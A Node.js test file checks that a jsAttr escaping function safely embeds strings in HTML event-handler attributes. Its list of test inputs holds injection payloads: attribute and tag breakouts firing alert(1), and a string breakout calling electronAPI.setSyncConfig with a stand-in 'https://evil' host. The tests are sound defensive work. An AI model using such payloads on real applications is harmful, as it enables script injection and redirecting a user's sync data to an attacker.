import { test } from 'node:test';
import assert from 'node:assert/strict';
import { jsAttr } from './text.js';

// The inverse of esc, applied the way the HTML parser decodes an attribute.
const unHtml = (s) => s.replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');

const NASTY = [
  "x');electronAPI.setSyncConfig('https://evil','t','p');('",
  'a"b onfocus="alert(1)',
  '</span><img src=x onerror=alert(1)>',
  'back\\slash\\',
  "it's",
  'line\nbreak\rreturn',
  '&quot;&amp;',
  'Orion Works',
];

test('jsAttr output carries nothing that ends the attribute or opens a tag', () => {
  for (const s of NASTY) assert.doesNotMatch(jsAttr(s), /["<>]/, s);
});

test('the handler receives exactly the original string', () => {
  for (const s of NASTY) {
    const literal = unHtml(jsAttr(s));
    assert.equal(new Function(`return '${literal}';`)(), s);
  }
});

test('jsAttr treats null and undefined as empty, like esc', () => {
  assert.equal(jsAttr(null), '');
  assert.equal(jsAttr(undefined), '');
});
